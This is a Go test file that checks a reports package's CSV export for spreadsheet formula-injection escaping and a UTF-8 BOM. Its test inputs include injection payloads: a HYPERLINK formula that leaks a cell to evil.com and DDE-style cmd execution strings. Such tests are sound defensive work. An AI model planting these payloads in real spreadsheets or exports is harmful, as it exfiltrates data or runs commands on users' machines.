package reports_test

import (
	"strings"
	"testing"

	"apaar-verify/internal/reports"
)

func TestSanitizeCSVCell_FormulaInjection(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"Normal Text", "Normal Text"},
		{"12345", "12345"},
		{"=HYPERLINK(\"http://evil.com?leak=\"&A1)", "'=HYPERLINK(\"http://evil.com?leak=\"&A1)"},
		{"+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"},
		{"-2+3*cmd", "'-2+3*cmd"},
		{"@SUM(A1:A10)", "'@SUM(A1:A10)"},
		{"\tmalicious tab", "'\tmalicious tab"},
		{"\rmalicious return", "'\rmalicious return"},
	}

	for _, tc := range tests {
		got := reports.SanitizeCSVCell(tc.input)
		if got != tc.expected {
			t.Errorf("SanitizeCSVCell(%q) = %q, expected %q", tc.input, got, tc.expected)
		}
	}
}

func TestExportCSV_UTF8BOMAndSanitization(t *testing.T) {
	headers := []string{"Column1", "=UnsafeHeader"}
	records := [][]string{
		{"Safe Value", "+cmd.exe"},
		{"@SUM", "Normal"},
	}

	b, err := reports.ExportCSV(headers, records)
	if err != nil {
		t.Fatalf("failed to export CSV: %v", err)
	}

	// 1. Must start with UTF-8 BOM: 0xEF, 0xBB, 0xBF
	if len(b) < 3 || b[0] != 0xEF || b[1] != 0xBB || b[2] != 0xBF {
		t.Fatalf("CSV output missing UTF-8 BOM for Excel compatibility")
	}

	content := string(b[3:])
	// Must neutralize formula cells
	if !strings.Contains(content, "'=UnsafeHeader") {
		t.Errorf("expected '=UnsafeHeader to be escaped, got %s", content)
	}
	if !strings.Contains(content, "'+cmd.exe") {
		t.Errorf("expected '+cmd.exe to be escaped, got %s", content)
	}
	if !strings.Contains(content, "'@SUM") {
		t.Errorf("expected '@SUM to be escaped, got %s", content)
	}
}
